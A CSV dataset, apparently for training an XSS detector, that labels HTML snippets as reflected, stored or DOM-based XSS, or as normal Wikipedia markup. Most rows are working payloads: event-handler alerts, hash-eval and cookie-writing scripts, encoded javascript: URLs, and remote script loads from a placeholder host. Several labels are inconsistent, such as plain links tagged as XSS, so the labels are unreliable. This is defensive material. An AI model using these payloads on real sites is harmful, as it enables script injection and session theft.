Sentence,Final_Label
"<track oncopy=""alert(1)"" contenteditable>test</track>",Reflected XSS
"<object onmousedown=""alert(1)"">test</object>",Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<body ontouchend=alert(1)> ,Reflected XSS
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<svg><figure onload=alert(1)></figure>,Stored XSS
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",Reflected XSS
<q id=x tabindex=1 onfocusin=alert(1)></q>,Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<base onpointermove=alert(1)>XSS</base>,Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<svg><wbr onload=alert(1)></wbr>,Stored XSS
"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;214–216 </li>",Normal
"<ruby onclick=""alert(1)"">test</ruby>",Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=33"" title=""Edit section: Deep recurrent neural networks"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",Reflected XSS
<bdo onpointerenter=alert(1)>XSS</bdo>,Reflected XSS
<ul onpointerup=alert(1)>XSS</ul>,Reflected XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",Stored XSS
<object onpointerdown=alert(1)>XSS</object>,Stored XSS
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",Reflected XSS
<svg><animate onend=alert(1) attributeName=x dur=1s>,Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
	 </span>,Normal
"<embed onkeyup=""alert(1)"" contenteditable>test</embed>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",Stored XSS
"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=22"" title=""Edit section: Embodied intelligence"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",Stored XSS
"<style onmouseover=""alert(1)"">test</style>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",Stored XSS
 ,Normal
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>,Stored XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></shadow>",Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",Reflected XSS
"<tfoot onmouseenter=""alert(1)"">test</tfoot>",Reflected XSS
"	 </span> <span class=""toctext"">Cybersecurity ",Normal
<svg><td onload=alert(1)></td>,Stored XSS
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",Stored XSS
 </li>,Normal
<mark onpointerleave=alert(1)>XSS</mark>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September ",Normal
Discussion:,Normal
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",Reflected XSS
"<body oncontextmenu=""alert(1)"">test</body>",Reflected XSS
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_4-234""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_4_234-0"">^ </a> </b> ",Normal
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<li><a href=""/wiki/Qualia"" title=""Qualia"">Qualia </a> </li>",Normal
"<noscript onmouseup=""alert(1)"">test</noscript>",Reflected XSS
"<h3><span class=""mw-headline"" id=""Symbolic"">Symbolic ",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<svg onmousemove=""alert(1)"">test</svg>",Stored XSS
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",Stored XSS
<object onerror=alert(1) data=1 type=image/gif>,Stored XSS
"<SCRIPT a="">"" '' SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
<iframe onpointerenter=alert(1)>XSS</iframe>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<a onmousedown=""alert(1)"">test</a>",Reflected XSS
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,Stored XSS
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 18.3 </li> </ul>",Normal
"<li class=""toclevel-1 tocsection-72""><a href=""#References""><span class=""tocnumber"">13 ",Normal
<svg><em onload=alert(1)></em>,Stored XSS
<nextid onpointerup=alert(1)>XSS</nextid>,Reflected XSS
"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",Reflected XSS
"<li><a href=""/wiki/Information_security"" title=""Information security"">Information security </a> </li>",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=SearchERP&amp;rft.atitle=Oracle+CEO+Mark+Hurd+sees+no+reason+to+fear+ERP+AI&amp;rft_id=https%3A%2F%2Fsearcherp.techtarget.com%2Fnews%2F252460208%2FOracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<spacer onpointerover=alert(1)>XSS</spacer>,Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September ",Normal
<object data=/ onload=alert(1)>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
	 </span> ,Normal
"<style onmousedown=""alert(1)"">test</style>",Reflected XSS
"<li><a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a>, p.&#160;265 </li>",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
 </li>,Normal
 </li>,Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,Reflected XSS
	 </span>,Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<li><a href=""/wiki/Intelligence_explosion"" class=""mw-redirect"" title=""Intelligence explosion"">Intelligence explosion </a> </li>",Normal
<svg><plaintext onload=alert(1)></plaintext>,Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
	 </span> </li>,Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
(alert)(1),Stored XSS
<script> alert(asdal'') </script>,Stored XSS
<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>,Reflected XSS
"<li><a href=""/wiki/Cognitive_closure_(philosophy)"" title=""Cognitive closure (philosophy)"">Cognitive closure </a> </li>",Normal
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Programming_language_theory"" title=""Programming language theory"">Software notations </a><br />and <a href=""/wiki/Programming_tool"" title=""Programming tool"">tools </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<nobr draggable=""true"" ondragend=""alert(1)"">test</nobr>",Reflected XSS
<svg><mark onload=alert(1)></mark>,Stored XSS
Multi-agent planning and emergent behavior:,Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<li><img alt=""List-Class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/16px-Symbol_list_class.svg.png"" decoding=""async"" title=""List-Class article"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/23px-Symbol_list_class.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/31px-Symbol_list_class.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/List_of_emerging_technologies"" title=""List of emerging technologies"">List of emerging technologies </a> </b> </li> </ul>",Normal
<svg><canvas onload=alert(1)></canvas>,Stored XSS
"<iframe oncontextmenu=""alert(1)"">test</iframe>",Stored XSS
"<SCRIPT a=`>` SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></object>",Stored XSS
<fieldset onpointerup=alert(1)>XSS</fieldset>,Reflected XSS
 ,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",Reflected XSS
"<h2><span class=""mw-headline"" id=""Tools"">Tools ",Normal
"<i oncopy=""alert(1)"" contenteditable>test</i>",Reflected XSS
"	 </span> <span class=""reference-text"">",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",Reflected XSS
<svg><html onload=alert(1)></html>,Stored XSS
<tbody onpointerout=alert(1)>XSS</tbody>,Reflected XSS
<spacer onpointerout=alert(1)>XSS</spacer>,Reflected XSS
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
¼script¾alert(¢¢)¼/script¾,Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D""></A>",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Goodfellow, Ian J.; Shlens, Jonathon; Szegedy, Christian (2014). ""Explaining and Harnessing Adversarial Examples"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1412.6572"">1412.6572 </a> ",Normal
"	 </span> <span class=""reference-text"">",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<svg><output onload=alert(1)></output>,Stored XSS
 </li>,Normal
"<rp onmouseup=""alert(1)"">test</rp>",Reflected XSS
"<rt onmouseenter=""alert(1)"">test</rt>",Reflected XSS
"<tbody onmouseout=""alert(1)"">test</tbody>",Reflected XSS
	 </span> </a> </li>,Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/stats.html"">Stats Collection</a></li>",Normal
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<pre onpointerover=alert(1)>XSS</pre>,Reflected XSS
"<label oncut=""alert(1)"" contenteditable>test</label>",Reflected XSS
"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">Command line tool",Normal
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",Reflected XSS
"<A HREF=""//www.google.com/""></A>",Stored XSS
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,Stored XSS
"<data onmouseup=""alert(1)"">test</data>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
</div>,Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
	 </span> </a> </li>,Normal
"<li id=""cite_note-79""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-79"">^ </a> </b> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script onkeypress=""alert(1)"" contenteditable>test</script>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<li id=""cite_note-FOOTNOTEDomingos2015188-223""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015188_223-0"">^ </a> </b> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<object onpointermove=alert(1)>XSS</object>,Stored XSS
<svg><title onload=alert(1)></title>,Stored XSS
"	 <div id=""Existential_risk_from_artificial_intelligence"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk </a> from <a class=""mw-selflink selflink"">artificial intelligence </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Concepts </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;712–754, </li>",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<small onmouseover=""alert(1)"">test</small>",Reflected XSS
	 </span> </li>,Normal
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>",Reflected XSS
"<li class=""toclevel-3 tocsection-54""><a href=""#Decrease_in_demand_for_human_labor""><span class=""tocnumber"">8.2.4 ",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<li id=""cite_note-367""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-367"">^ </a> </b> ",Normal
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",Reflected XSS
"<SCRIPT/ SRC=""http://.rocks/.js""></SCRIPT>",Stored XSS
<svg><wbr onload=alert(1)></wbr>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<svg><aside onload=alert(1)></aside>,Stored XSS
<dfn onpointerout=alert(1)>XSS</dfn>,Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
&#x3C,Stored XSS
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;382–387 </li>",Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,Stored XSS
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strike>",Reflected XSS
<svg><strong onload=alert(1)></strong>,Stored XSS
<basefont onpointerleave=alert(1)>XSS</basefont>,Reflected XSS
<footer onpointerout=alert(1)>XSS</footer>,Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<A HREF=""http://66.102.7.147/""></A>",Stored XSS
"	 </span> <span class=""toctext"">Transhumanism ",Normal
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<svg><small onload=alert(1)></small>,Stored XSS
"<iframe oncut=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<dt oncontextmenu=""alert(1)"">test</dt>",Reflected XSS
<center id=x tabindex=1 onactivate=alert(1)></center>,Reflected XSS
"<canvas onkeyup=""alert(1)"" contenteditable>test</canvas>",Reflected XSS
<iframe onpointerover=alert(1)>XSS</iframe>,Stored XSS
"<li><a href=""/wiki/AI_takeover"" title=""AI takeover"">AI takeover </a> </li>",Normal
<svg><meta onload=alert(1)></meta>,Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",Reflected XSS
<script onerror=alert(1) src=/></script>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"	 </span> <span class=""reference-text""><a href=""#CITEREFEdelson1991"">Edelson 1991 </a>. ",Normal
<svg><table onload=alert(1)></table>,Stored XSS
"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=11"" title=""Edit section: Motion and manipulation"">edit </a>",Normal
"<optgroup ondblclick=""alert(1)"">test</optgroup>",Reflected XSS
"	 <div class=""magnify""><a href=""/wiki/File:Laproscopic_Surgery_Robot.jpg"" class=""internal"" title=""Enlarge""> </a> </div>A patient-side surgical arm of <a href=""/wiki/Da_Vinci_Surgical_System"" title=""Da Vinci Surgical System"">Da Vinci Surgical System </a> </div> </div> </div><p>AI in healthcare is often used for classification, whether to automate initial evaluation of a CT scan or EKG or to identify high risk patients for population health. The breadth of applications is rapidly increasing.",Normal
 ,Normal
"<tfoot onmousedown=""alert(1)"">test</tfoot>",Reflected XSS
	 </span> </a>,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
	 </span> 2016 ,Normal
	 </span> </li>,Normal
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;211–239 </li>",Normal
          <dd>,Normal
"      <div class=""wy-nav-content"">",Normal
<menu onpointerleave=alert(1)>XSS</menu>,Reflected XSS
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>",Normal
<p id=x tabindex=1 onactivate=alert(1)></p>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script draggable=""true"" ondragstart=""alert(1)"">test</script>",Stored XSS
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/contracts.html"">Spiders Contracts</a></li>",Normal
<svg><article onload=alert(1)></article>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>,Reflected XSS
"	 <div id=""Links_to_related_articles"" style=""font-size:114%;margin:0 4em"">Links to related articles </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px;font-size:114%"">",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<ul><li><a href=""/wiki/Abductive_reasoning"" title=""Abductive reasoning"">Abductive reasoning </a> </li>",Normal
"<li id=""cite_note-Natural_language_processing-120""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Natural_language_processing_120-0"">^ </a> </b> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<li id=""cite_note-329""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-329"">^ </a> </b> ",Normal
 </li>,Normal
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tbody>",Reflected XSS
<svg id=x tabindex=1 onactivate=alert(1)></svg>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
"	 </span> <span class=""toctext"">Deep feedforward neural networks ",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
 ,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<small onpointerleave=alert(1)>XSS</small>,Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<p>Machine learning (ML), a fundamental concept of AI research since the field's inception,<sup id=""cite_ref-115"" class=""reference""><a href=""#cite_note-115"">&#91;112&#93; </a> </sup> is the study of computer algorithms that improve automatically through experience.<sup id=""cite_ref-116"" class=""reference""><a href=""#cite_note-116"">&#91;113&#93; </a> </sup><sup id=""cite_ref-Machine_learning_117-0"" class=""reference""><a href=""#cite_note-Machine_learning-117"">&#91;114&#93; </a> </sup>",Normal
"<del ondblclick=""alert(1)"">test</del>",Reflected XSS
"<header onkeydown=""alert(1)"" contenteditable>test</header>",Reflected XSS
      });,Normal
<svg><figcaption onload=alert(1)></figcaption>,Stored XSS
"<script onmousemove=""alert(1)"">test</script>",Stored XSS
"	 </span> <span class=""reference-text""><cite class=""citation book""><a rel=""nofollow"" class=""external text"" href=""https://ec.europa.eu/info/sites/info/files/commission-white-paper-artificial-intelligence-feb2020_en.pdf""><i>White Paper: On Artificial Intelligence - A European approach to excellence and trust </i> </a> <span class=""cs1-format"">(PDF) ",Normal
"<u oncopy=""alert(1)"" contenteditable>test</u>",Reflected XSS
<svg><html onload=alert(1)></html>,Stored XSS
<input type=checkbox id=x onfocusin=alert(1)>,Reflected XSS
<script onpointermove=alert(1)>XSS</script>,Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"	 </span> <span class=""reference-text""><cite class=""citation web"">Bostrom, Nick (2015). <a rel=""nofollow"" class=""external text"" href=""https://www.ted.com/talks/nick_bostrom_what_happens_when_our_computers_get_smarter_than_we_are/transcript"">""What happens when our computers get smarter than we are?"" </a>. <a href=""/wiki/TED_(conference)"" title=""TED (conference)"">TED (conference) </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=What+happens+when+our+computers+get+smarter+than+we+are%3F&amp;rft.pub=TED+%28conference%29&amp;rft.date=2015&amp;rft.aulast=Bostrom&amp;rft.aufirst=Nick&amp;rft_id=https%3A%2F%2Fwww.ted.com%2Ftalks%2Fnick_bostrom_what_happens_when_our_computers_get_smarter_than_we_are%2Ftranscript&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<svg><bgsound onload=alert(1)></bgsound>,Stored XSS
    <p>,Normal
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",Stored XSS
<svg><sup onload=alert(1)></sup>,Stored XSS
"<SCRIPT/SRC=""http://.rocks/.js""></SCRIPT>",Stored XSS
"<li id=""cite_note-Robotics-128""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Robotics_128-0"">^ </a> </b> ",Normal
 </ul>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,Stored XSS
